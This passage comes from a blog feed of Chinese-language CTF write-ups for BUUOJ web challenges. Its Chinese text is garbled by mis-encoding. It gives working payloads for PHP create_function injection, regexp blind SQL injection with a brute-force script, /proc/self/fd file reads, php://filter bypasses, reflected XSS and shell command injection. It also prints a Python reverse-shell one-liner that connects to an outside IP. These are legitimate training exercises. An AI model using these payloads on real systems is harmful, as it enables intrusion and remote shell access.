preg_match(&#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#39;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#39;, $arg) ) &#123;     die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag =w=&quot;); &#125; else &#123;     include &quot;flag.php&quot;;    $code(&#39;&#39;, $arg); &#125; ?&gt;       </code></pre><p>$codeå’Œ$argå¯ä»¥é€šè¿‡<code>extract($_GET[&quot;flag&quot;]);</code>ä¼ å…¥     </p><p><code>creat_function()</code>å‡½æ•°       </p><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/163792/4/20511/6856/6082e575Ef04fe2e5/514edbaaa03f01e8.png" alt="01.png">      </p><pre><code>$func=creat_function(&#39;$a,$b&#39;,&#39;return $a*$b;&#39;);func()  å°±ç›¸å½“äº    function func($a,$b)&#123;    return $a*$b;&#125;  </code></pre><p>å¦‚æœå‚æ•°å¯æ§ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡<code>&#125;</code>æå‰ç»“æŸå‡½æ•°ï¼Œæ‰§è¡Œå…¶ä»–è¯­å¥</p><pre><code>$func=creat_function(&#39;$a,$b&#39;,&#39;return $a*$b;&#125;eval(system(&#39;ls&#39;));//&#39;);   function func($a,$b)    &#123;        return $a*$b;&#125;        eval(system(&#39;ls&#39;));//&#125;</code></pre><p>flag[code]=create_function<br>%66%6C%61%67%5B%63%6F%64%65%5D=%63%72%65%61%74%65%5F%66%75%6E%63%74%69%6F%6E<br>flag[arg]=;}a();//<br>%66%6C%61%67%5B%61%72%67%5D=    </p><p><code>get_defined_vars()</code>å‡½æ•°ä¼šä»¥æ•°ç»„å½¢å¼è¿”å›æ‰€æœ‰å˜é‡å’Œå€¼<br><code>flag[code]=create_function&amp;flag[arg]=;&#125;var_dump(get_defined_vars());//</code><br><img src="https://img11.360buyimg.com/ddimg/jfs/t1/163461/36/20309/34836/6082eb4cE5ed6382e/e08bdbff0aa587d8.png" alt="02.png"><br><code>require</code>è¯»å–æ–‡ä»¶<br><code>flag[arg]=;&#125;require(base64_decode(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());//</code><br><img src="https://img13.360buyimg.com/ddimg/jfs/t1/183003/35/675/45335/6082ec64E4b186153/4b8afb83d9a49b77.png" alt="03.png"><br>è¿™ä¸ªæ˜¯å‡çš„<br>è¦ç”¨ä¼ªåè®®ï¼ŒURLå–å    </p><p><code>;&#125;require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));//</code><br><img src="https://img12.360buyimg.com/ddimg/jfs/t1/173695/38/6129/110660/6082ef53Eed0617a1/19b0d876457d7346.png" alt="04.png">       </p><p><a href="https://www.gem-love.com/ctf/770.html">MORE</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQLi</title>
    <link href="/2021/04/22/BUU73/"/>
    <url>/2021/04/22/BUU73/</url>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=".`."></a>.`.</h2><p><img src="https://s.pc.qq.com/tousu/img/20210422/8769310_1619090005.jpg" alt="01.png">      </p><p><code>robots.txt</code>     </p><pre><code>User-agent: *Disallow: /hint.txt      </code></pre><p><code>hint.txt</code>      </p><pre><code>$black_list = &quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#39;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;;If $_POST[&#39;passwd&#39;] === admin&#39;s password,Then you will get the flag;     </code></pre><p>regexpæ­£åˆ™æ³¨å…¥<br><code>regexp</code>å‡½æ•°ï¼ŒåŒ¹é…å­—ç¬¦      </p><p><img src="https://s.pc.qq.com/tousu/img/20210422/1627861_1619091624.jpg" alt="02.png">         </p><p>å•å¼•å·è¢«è¿‡        </p><p>ç”¨<code>\</code>è½¬ä¹‰usernameçš„å•å¼•å·ï¼Œpasswdåæ¥<code>||</code>(æˆ–)         </p><p>payload:<code>username=\&amp;passwd=||/**/passwd/**/regexp/**/&quot;^a&quot;;%00</code>     </p><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parsepasswd = <span class="hljs-string">&#x27;&#x27;</span>string= string.ascii_lowercase + string.digits + <span class="hljs-string">&#x27;_&#x27;</span>    <span class="hljs-comment">#å°å†™å­—æ¯åŠ æ•°å­—åŠ _</span>url = <span class="hljs-string">&#x27;http://83eb23d8-2065-4521-9970-018a0b4ce880.node3.buuoj.cn/index.php&#x27;</span><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> string:        data = &#123;            <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;\\&quot;</span>,            <span class="hljs-string">&quot;passwd&quot;</span>:<span class="hljs-string">&quot;||/**/passwd/**/regexp/**/\&quot;^&#123;&#125;\&quot;;&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>((passwd+m),parse.unquote(<span class="hljs-string">&#x27;%00&#x27;</span>))       <span class="hljs-comment">##parse.unquoteè¿›è¡Œurlè§£ç ï¼Œä¸è§£ç ç›´æ¥å¼„ä¸è¡Œ</span>        &#125;        res = requests.post(url,data=data)        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;welcome&#x27;</span> <span class="hljs-keyword">in</span> res.text:            passwd += m            print(m)            <span class="hljs-keyword">break</span>    <span class="hljs-keyword">if</span> m==<span class="hljs-string">&#x27;_&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;welcome&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res.text:        <span class="hljs-keyword">break</span>print(passwd)</code></pre></code></pre><p><img src="https://s.pc.qq.com/tousu/img/20210422/1945636_1619091932.jpg" alt="03.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PicDown</title>
    <link href="/2021/04/18/BUU72/"/>
    <url>/2021/04/18/BUU72/</url>
    
    <content type="html"><![CDATA[<h2 id="PicDown"><a href="#PicDown" class="headerlink" title="PicDown"></a>PicDown</h2><p><img src="https://ae03.alicdn.com/kf/Uce6df5309dde4da49889e468a001b3c4b.jpg" alt="01.png">      </p><p>éšä¾¿è¾“ï¼Œurlå˜æˆäº†<code>http://7a97406b-5c95-46e4-be43-8311778ca05e.node3.buuoj.cn/?url=127.0.0.1</code><br>çœ‹åˆ°urlï¼Œä»¥ä¸ºæ˜¯ssrf,è¯•äº†å‡ ä¸‹ï¼Œæ„Ÿè§‰ä¸æ˜¯ï¼Œçœ‹äº†wp       </p><p>æ˜¯ä»»æ„æ–‡ä»¶è¯»å–ï¼Œç”šè‡³ä¸éœ€è¦ç›®å½•ç©¿è¶Š<img src="https://ae04.alicdn.com/kf/U6f624042f7c74f188c65470ebb0687d0j.jpg" alt="02.png">        </p><p>ç›´æ¥è¯»<code>/flag</code>å¯ä»¥è¯»å‡ºæ¥         </p><p><code>/procç›®å½•</code>      </p><p>Linuxä¸Šçš„<code>/procç›®å½•</code>æ˜¯ä¸€ç§è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼Œå­˜å‚¨çš„æ˜¯å½“å‰å†…æ ¸è¿è¡ŒçŠ¶æ€çš„ä¸€ç³»åˆ—æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯è¿›ç¨‹çš„ä¿¡æ¯<br>æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸€ä¸ªID         </p><p><img src="https://ae02.alicdn.com/kf/U555898227cde48a2b6d2420930eef73f4.jpg" alt="03.png">       </p><p>æˆ‘ä»¬çœ‹ä¸€ä¸‹1è¿›ç¨‹ä¸‹       </p><p><img src="https://ae03.alicdn.com/kf/U2af9107ac917499d97778f87a30fbcbdM.jpg" alt="04.png">         </p><p><code>/cmdline</code>æ–‡ä»¶å­˜å‚¨ç€å¯åŠ¨å½“å‰è¿›ç¨‹çš„å®Œæ•´å‘½ä»¤<br><img src="https://ae03.alicdn.com/kf/Uf71910986c3d4a0ebe9e98d3d0a57d12z.jpg" alt="05.png">      </p><p><code>/proc/self è¡¨ç¤ºå½“å‰è¿›ç¨‹ç›®å½•</code>    </p><p>å›åˆ°é¢˜ä¸Šï¼Œçœ‹ä¸€ä¸‹å½“å‰è¿›ç¨‹çš„å‘½ä»¤<code>url=/proc/self/cmdline</code><br><img src="https://ae03.alicdn.com/kf/U96555e477ec64b21977950e508bfc592L.jpg" alt="06.png">       </p><p>è¯»ä¸€ä¸‹<code>app.py</code>       </p><pre><code><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, Response<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> urllibapp = Flask(__name__)SECRET_FILE = <span class="hljs-string">&quot;/tmp/secret.txt&quot;</span>f = <span class="hljs-built_in">open</span>(SECRET_FILE)SECRET_KEY = f.read().strip()os.remove(SECRET_FILE)<span class="hljs-meta">@app.route(&#x27;/&#x27;)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;search.html&#x27;</span>)<span class="hljs-meta">@app.route(&#x27;/page&#x27;)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">page</span>():</span>    url = request.args.get(<span class="hljs-string">&quot;url&quot;</span>)    <span class="hljs-keyword">try</span>:        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> url.lower().startswith(<span class="hljs-string">&quot;file&quot;</span>):            res = urllib.urlopen(url)            value = res.read()            response = Response(value, mimetype=<span class="hljs-string">&#x27;application/octet-stream&#x27;</span>)            response.headers[<span class="hljs-string">&#x27;Content-Disposition&#x27;</span>] = <span class="hljs-string">&#x27;attachment; filename=beautiful.jpg&#x27;</span>            <span class="hljs-keyword">return</span> response        <span class="hljs-keyword">else</span>:            value = <span class="hljs-string">&quot;HACK ERROR!&quot;</span>    <span class="hljs-keyword">except</span>:        value = <span class="hljs-string">&quot;SOMETHING WRONG!&quot;</span>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;search.html&#x27;</span>, res=value)<span class="hljs-meta">@app.route(&#x27;/no_one_know_the_manager&#x27;)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">manager</span>():</span>    key = request.args.get(<span class="hljs-string">&quot;key&quot;</span>)    print(SECRET_KEY)    <span class="hljs-keyword">if</span> key == SECRET_KEY:        shell = request.args.get(<span class="hljs-string">&quot;shell&quot;</span>)        os.system(shell)        res = <span class="hljs-string">&quot;ok&quot;</span>    <span class="hljs-keyword">else</span>:        res = <span class="hljs-string">&quot;Wrong Key!&quot;</span>    <span class="hljs-keyword">return</span> res<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8080</span>)</code></pre></code></pre><p>åœ¨<code>/no_one_know_the_manager</code>è·¯ç”±ä¸‹<br>getåˆ°çš„key==SECRET_KEYå°±èƒ½æ‰§è¡Œå‘½ä»¤äº†         </p><p>å¾—åˆ°SECRET_KEY       </p><p><code>/proc/self/fd</code><br>fdè¿™ä¸ªç›®å½•é‡Œé¢åŒ…å«è¿™å½“å‰è¿›ç¨‹æ‰“å¼€çš„æ¯ä¸€ä¸ªæ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼ˆfile descriptorï¼‰ï¼Œè¿™äº›æ–‡ä»¶æè¿°ç¬¦æ˜¯æŒ‡å‘å®é™…æ–‡ä»¶çš„ä¸€ä¸ªç¬¦å·é“¾æ¥ï¼Œå³æ¯ä¸ªé€šè¿‡è¿™ä¸ªè¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶éƒ½ä¼šæ˜¾ç¤ºåœ¨è¿™é‡Œã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡fdç›®å½•é‡Œçš„æ–‡ä»¶è·å¾—æŒ‡å®šè¿›ç¨‹æ‰“å¼€çš„æ¯ä¸ªæ–‡ä»¶çš„è·¯å¾„ä»¥åŠæ–‡ä»¶å†…å®¹ã€‚       </p><p><strong>å¦‚æœä¸€ä¸ªç¨‹åºç”¨<code>open()</code>æ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶ä½†æœ€ç»ˆæ²¡æœ‰å…³é—­ä»–ï¼Œå³ä¾¿ä»å¤–éƒ¨ï¼ˆå¦‚<code>os.remove(SECRET_FILE)</code>ï¼‰åˆ é™¤è¿™ä¸ªæ–‡ä»¶ä¹‹åï¼Œåœ¨ <code>/proc</code> è¿™ä¸ªè¿›ç¨‹çš„ <code>pid</code> ç›®å½•ä¸‹çš„ <code>fd</code> æ–‡ä»¶æè¿°ç¬¦ç›®å½•ä¸‹è¿˜æ˜¯ä¼šæœ‰è¿™ä¸ªæ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œé€šè¿‡è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦æˆ‘ä»¬å³å¯å¾—åˆ°è¢«åˆ é™¤æ–‡ä»¶çš„å†…å®¹ã€‚</strong>          </p><p>æ‰€ä»¥è¯»å–<code>/proc/self/fd/1</code><br>å¯¹1çˆ†ç ´ï¼Œå½“ä¸º3æ—¶ï¼Œé•¿åº¦ä¸ä¸€æ ·<br><img src="https://ae02.alicdn.com/kf/Ub2f3a30c5fcd4cc69104781da2a8dc3ey.jpg" alt="07.png">        </p><p>éœ€è¦å°†SECRET_KEY urlç¼–ç ä¸€ä¸‹<br><img src="https://ae02.alicdn.com/kf/U77030cdb74d544d190193eb79ca4157aN.jpg" alt="08.png">       </p><p>å› ä¸ºsystemæ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥éœ€è¦åå¼¹shell       </p><pre><code>python -c &quot;importos,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;172.16.154.239&#39;,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&quot;       </code></pre><p>pythonåå¼¹shellï¼ŒåŒæ ·urlç¼–ç        </p><p><a href="https://blog.csdn.net/qq_45521281/article/details/114594402?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&spm=1001.2101.3001.4242">MORE</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Encode_and_encode</title>
    <link href="/2021/04/16/BUU71/"/>
    <url>/2021/04/16/BUU71/</url>
    
    <content type="html"><![CDATA[<h2 id="câ€”-aâ€”-i"><a href="#câ€”-aâ€”-i" class="headerlink" title="câ€”-aâ€”-i"></a>câ€”-aâ€”-i</h2><pre><code><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;  show_source(<span class="hljs-keyword">__FILE__</span>);  <span class="hljs-keyword">exit</span>();&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params">$str</span>) </span>&#123;  $banword = [    <span class="hljs-comment">// no path traversal</span>    <span class="hljs-string">&#x27;\.\.&#x27;</span>,    <span class="hljs-comment">// no stream wrapper</span>    <span class="hljs-string">&#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;</span>,    <span class="hljs-comment">// no data exfiltration</span>    <span class="hljs-string">&#x27;flag&#x27;</span>  ];  $regexp = <span class="hljs-string">&#x27;/&#x27;</span> . implode(<span class="hljs-string">&#x27;|&#x27;</span>, $banword) . <span class="hljs-string">&#x27;/i&#x27;</span>;  <span class="hljs-keyword">if</span> (preg_match($regexp, $str)) &#123;    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;&#125;$body = file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>);$json = json_decode($body, <span class="hljs-literal">true</span>);<span class="hljs-keyword">if</span> (is_valid($body) &amp;&amp; <span class="hljs-keyword">isset</span>($json) &amp;&amp; <span class="hljs-keyword">isset</span>($json[<span class="hljs-string">&#x27;page&#x27;</span>])) &#123;  $page = $json[<span class="hljs-string">&#x27;page&#x27;</span>];  $content = file_get_contents($page);  <span class="hljs-keyword">if</span> (!$content || !is_valid($content)) &#123;    $content = <span class="hljs-string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;  &#125;&#125; <span class="hljs-keyword">else</span> &#123;  $content = <span class="hljs-string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;&#125;<span class="hljs-comment">// no data exfiltration!!!</span>$content = preg_replace(<span class="hljs-string">&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;</span>, <span class="hljs-string">&#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;</span>, $content);<span class="hljs-keyword">echo</span> json_encode([<span class="hljs-string">&#x27;content&#x27;</span> =&gt; $content]);</code></pre></code></pre><p>ä»¥jsonçš„æ ¼å¼postæ•°æ®ï¼Œè¯»å–flagæ–‡ä»¶        </p><p>jsonä¸­å¯ä»¥ç”¨utf-16ç¼–ç        </p><p>phpâ€”-&gt;<code>\u0070\u0068\u0070</code><br>flagâ€”â€“&gt;<code>\u0066\u006C\u0061\u0067</code>       </p><p>ä¼ªåè®®è¯»å–å³å¯        </p><p>payloadï¼š<code>&#123; &quot;page&quot; : &quot;\u0070\u0068\u0070://filter/read=convert.Base64-encode/resource=/\u0066\u006c\u0061\u0067&quot;&#125;</code></p><p><img src="https://ae04.alicdn.com/kf/Uc0dae37fec114059ba662aef6c3440a4s.jpg" alt="01.png"></p><hr><hr><p><img src="https://ae03.alicdn.com/kf/U077aee7bf14d4989834bd3d5c060ab95X.jpg" alt="æˆ‘æ˜¯ä¼å…µ">    </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nep1</title>
    <link href="/2021/04/16/nep1/"/>
    <url>/2021/04/16/nep1/</url>
    
    <content type="html"><![CDATA[<h2 id="â€”-â€”"><a href="#â€”-â€”" class="headerlink" title="â€”__â€”"></a>â€”__â€”</h2><p>1.æœ¬è§†é¢‘ä¸€å¼€å§‹ä»‹ç»äº†å“ªä¸¤ä¸ªå·¥å…·ï¼Œä»–ä»¬çš„ä½œç”¨åˆ†åˆ«æ˜¯ä»€ä¹ˆï¼Ÿä¸ºä»€ä¹ˆä½œè€…ä¼šæ¨èfirefoxï¼Œå®ƒçš„ä¼˜ç‚¹æ˜¯ä»€ä¹ˆï¼Ÿï¼ˆ5åˆ†ï¼‰      </p><pre><code>Burp Proxy-----æ‹¦æˆªHTPP(s)è¯·æ±‚ï¼ŒæŠ“åŒ…ï¼Œä¿®æ”¹è¯·æ±‚ï¼Œå‘åŒ…......        Firefox-----å¥½ç”¨çš„å¼€å‘äººå‘˜å·¥å…·......</code></pre><p>2.æœ¬è§†é¢‘ä¸­ä½“ç°äº†å“ªäº›æ”»é˜²ä¸Šçš„å“²å­¦è§‚ç‚¹ï¼Ÿä½œè€…å¸Œæœ›ä½ å…»æˆä»€ä¹ˆæ ·çš„æ€ç»´ï¼Ÿè¿™äº›æ€ç»´åœ¨å¸®åŠ©ä½ æŒ–æ˜æ¼æ´çš„æ—¶å€™æœ‰ä»€ä¹ˆå¸®åŠ©ï¼Ÿç»“åˆä½ çš„ç»å†ä¸è§†é¢‘å†…å®¹è°ˆè°ˆä½ çš„çœ‹æ³•ã€‚ï¼ˆ10åˆ†ï¼‰</p><pre><code>æ”»è¦æ‰¾ä¸€ç‚¹ï¼Œé˜²è¦æ‰¾å…¨éƒ¨      å¯¹åº”ç”¨ç¨‹åºçš„æ¯ä¸ªæŒ‰é’®éƒ½çœ‹çœ‹ï¼Œå¹¶æ€è€ƒç¨‹åºå¯èƒ½è¢«æ”»å‡»çš„æ–¹å¼</code></pre><p>3.å®¡è®¡ä»¥ä¸‹ä»£ç ï¼š</p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[ <span class="hljs-string">&#x27; name &#x27;</span> ]))&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;Hello <span class="hljs-subst">&#123;$_GET[&#x27;name&#x27;]&#125;</span> !&lt;/h1&gt;&quot;</span>;&#125;<span class="hljs-meta">?&gt;</span>&lt;form method=<span class="hljs-string">&quot;GET&quot;</span>&gt;Enter your name: &lt;input type=<span class="hljs-string">&quot;input&quot;</span> name=<span class="hljs-string">&quot;name&quot;</span>&gt;&lt;br&gt;&lt;input type=<span class="hljs-string">&quot; submit&quot;</span>&gt;</code></pre></code></pre><p>æœ¬æ®µä»£ç æ¶‰åŠåˆ°å®¢æˆ·ç«¯ï¼ŒæœåŠ¡ç«¯ä»¥åŠé€šä¿¡åè®®ã€‚<br>è¿è¡Œåœ¨å®¢æˆ·ç«¯çš„ä»£ç ä¸»è¦æœ‰HTMLä»¥åŠjavascriptï¼Œç”±æµè§ˆå™¨æ ¸å¿ƒè´Ÿè´£è§£é‡Š</p><p>é€šä¿¡åè®®ä¸ºHTTPåè®®ï¼Œæœ‰å¤šç§æ ¼å¼çš„è¯·æ±‚åŒ…ï¼Œå¸¸è§çš„ä¸ºPOSTä¸GET</p><p>è¿è¡Œåœ¨æœåŠ¡ç«¯çš„ä»£ç ä¸ºphpï¼Œç”±phpæ ¸å¿ƒè´Ÿè´£è§£é‡Šã€‚</p><p>ç”¨æˆ·ç«¯ä¸æœåŠ¡ç«¯é€šè¿‡HTTPé€šä¿¡åè®®è¿›è¡Œäº¤äº’ã€‚</p><p>é‚£ä¹ˆï¼Œä»¥ä¸Šä»£ç ä¸­ï¼Œå“ªäº›éƒ¨åˆ†å±äºå®¢æˆ·ç«¯çš„å†…å®¹ï¼Œå“ªäº›å±äºæœåŠ¡ç«¯çš„å†…å®¹ï¼Ÿï¼ˆ1åˆ†ï¼‰</p><pre><code>htmléƒ¨åˆ†å±äºå®¢æˆ·ç«¯çš„å†…å®¹ï¼ŒPHPéƒ¨åˆ†å±äºæœåŠ¡ç«¯çš„å†…å®¹</code></pre><p>å®¢æˆ·ç«¯æ˜¯é€šè¿‡ä¼ é€’ä»€ä¹ˆå‚æ•°æ¥æ§åˆ¶æœåŠ¡ç«¯ä»£ç çš„ï¼Ÿï¼ˆ1åˆ†ï¼‰</p><pre><code>name</code></pre><p>å®¢æˆ·ç«¯é€šè¿‡æ§åˆ¶è¯¥å‚æ•°ä¼šå¯¹æœåŠ¡ç«¯é€ æˆä»€ä¹ˆå½±å“ï¼Œç»§è€Œä½¿å¾—å®¢æˆ·ç«¯æœ¬èº«æ”¶åˆ°å½±å“ï¼Œä»è€Œé€ æˆäº†ä»€ä¹ˆæ¼æ´ï¼Ÿå¦‚æœæ˜¯xssæ¼æ´ï¼Œå…·ä½“åˆæ˜¯ä»€ä¹ˆç±»å‹çš„xssæ¼æ´ï¼Œä¸ºä»€ä¹ˆï¼Ÿï¼ˆ3åˆ†ï¼‰</p><pre><code>åå°„å‹xssæäº¤name=&lt;script&gt;alert(1)&lt;/script&gt;åæŸ¥çœ‹é¡µé¢æºä»£ç ï¼Œå‘ç°æ’å…¥äº†&lt;script&gt;æ ‡ç­¾å¹¶è¢«ç½‘é¡µè§£æ       </code></pre><p><img src="https://ae04.alicdn.com/kf/U20e43d350dcd492c8cd41f983b285f5dw.jpg" alt="01.png"></p><p>4.æ€è€ƒï¼šç°å®ä¸­å¦‚ä½•åˆ©ç”¨xssæ¼æ´å®æ–½æ”»å‡»ï¼Œæˆ‘ä»¬åº”è¯¥å¦‚ä½•é¢„é˜²ï¼Ÿï¼ˆ1åˆ†ï¼‰</p><pre><code>åœ¨ç½‘ç«™ä¸­æ’å…¥XSSè·å¾—ç®¡ç†å‘˜cookieï¼Œç™»å½•åå°ç®¡ç†é¡µé¢.......       è¿‡æ»¤æ ‡ç­¾ï¼ŒHTTP-only</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>EasyBypass</title>
    <link href="/2021/04/15/BUU70/"/>
    <url>/2021/04/15/BUU70/</url>
    
    <content type="html"><![CDATA[<h2 id="â€¦â€¦â€¦"><a href="#â€¦â€¦â€¦" class="headerlink" title="â€¦â€¦â€¦"></a>â€¦â€¦â€¦</h2><p>ä»£ç å®¡è®¡     </p><p><img src="https://ae04.alicdn.com/kf/U81afd0c96ea04194babb7ddac8d9d8acR.jpg" alt="01.png">     </p><p>åº”è¯¥æ³¨æ„åˆ°comm1ä¸­æ²¡æœ‰è¿‡æ»¤<code>tac</code>     </p><p>flagè¢«è¿‡ï¼Œå¯ä»¥ç”¨é€šé…ç¬¦<code>f???</code>      </p><p>ä¸€å¼€å§‹è§‰å¾—ç”¨<code>;</code>æŠŠfileæ¯™äº†å°±è¡Œäº†ï¼Œä½†æˆ‘å¿½ç•¥äº†     </p><pre><code>$comm1 = &#39;&quot;&#39; . $comm1 . &#39;&quot;&#39;;$comm2 = &#39;&quot;&#39; . $comm2 . &#39;&quot;&#39;;</code></pre><p>è¿˜åº”è¯¥é—­åˆåŒå¼•å·         </p><p>payloadï¼š<code>?comm1=&quot;;tac /f???;&quot;</code><br>payloadï¼š<code>?comm1=&quot;;tac /fl\ag;&quot;</code><br>ä¹‹å‰é‡åˆ°è¿‡è¿™ä¸ªï¼Œä¸¤ä¸ª<code>\\</code>è¿‡æ»¤ä¸äº†<code>\</code>ï¼Œå› ä¸ºè¦ç»è¿‡PHPå’Œæ­£åˆ™ä¸¤å±‚è§£æï¼Œæœ€ååŒ¹é…çš„æ˜¯ä¸ª<code>|</code><br><img src="https://ae04.alicdn.com/kf/U20fbfe11e83c4e30a3043885763b63b9L.jpg" alt="02.png"><br>fileé—­åˆï¼Œå‘½ä»¤æ‰§è¡Œ           </p><p>è¿™æ ·ä¸€é“é¢˜åœ¨æœ¬åœ°è¯•äº†åŠå¤©ï¼Œå¤ªèœäº†        </p><p>###Linuxé€šé…ç¬¦     </p><pre><code>|     #ç®¡é“ç¬¦ï¼Œæˆ–è€…ï¼ˆæ­£åˆ™ï¼‰   #å‘½ä»¤1 | å‘½ä»¤2ï¼Œå‘½ä»¤1çš„ç»“æœä¼ é€’ç»™å‘½ä»¤2&gt;     #è¾“å‡ºé‡å®šå‘   #æ¸…ç©ºåŸæ–‡å†…å®¹ï¼Œç„¶åå‘æ–‡ä»¶é‡Œè¿½åŠ å†…å®¹&gt;&gt;    #è¾“å‡ºè¿½åŠ é‡å®šå‘   #è¿½åŠ åˆ°æ–‡ä»¶æœ€åä¸€è¡Œ&lt;     #è¾“å…¥é‡å®šå‘&lt;&lt;    #è¿½åŠ è¾“å…¥é‡å®šå‘~     #å½“å‰ç”¨æˆ·å®¶ç›®å½•`` $() #å¼•ç”¨å‘½ä»¤è¢«æ‰§è¡Œåçš„ç»“æœ$     #ä»¥ã€‚ã€‚ã€‚ç»“å°¾ï¼ˆæ­£åˆ™ï¼‰^     #ä»¥ã€‚ã€‚ã€‚å¼€å¤´ï¼ˆæ­£åˆ™ï¼‰*     #åŒ¹é…0æˆ–å¤šä¸ªå­—ç¬¦ï¼Œé€šé…ç¬¦ï¼Ÿ    #ä»»æ„ä¸€ä¸ªå­—ç¬¦ï¼Œé€šé…ç¬¦#       #æ³¨é‡Š&amp;       #è®©ç¨‹åºæˆ–è„šæœ¬åˆ‡æ¢åˆ°åå°æ‰§è¡Œ&amp;&amp;      #å¹¶ä¸” åŒæ—¶æˆç«‹[]      #è¡¨ç¤ºä¸€ä¸ªèŒƒå›´ï¼ˆæ­£åˆ™ï¼Œé€šé…ç¬¦ï¼‰&#123;&#125;      #äº§ç”Ÿä¸€ä¸ªåºåˆ—ï¼ˆé€šé…ç¬¦ï¼‰.       #å½“å‰ç›®å½•çš„ç¡¬é“¾æ¥..      #ä¸Šçº§ç›®å½•çš„ç¡¬é“¾æ¥</code></pre><p><img src="https://ae03.alicdn.com/kf/U7a5bcd1aa2484b7d9ee175e7b557cd0dt.jpg" alt="03.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SimplePHP</title>
    <link href="/2021/04/13/BUU69/"/>
    <url>/2021/04/13/BUU69/</url>
    
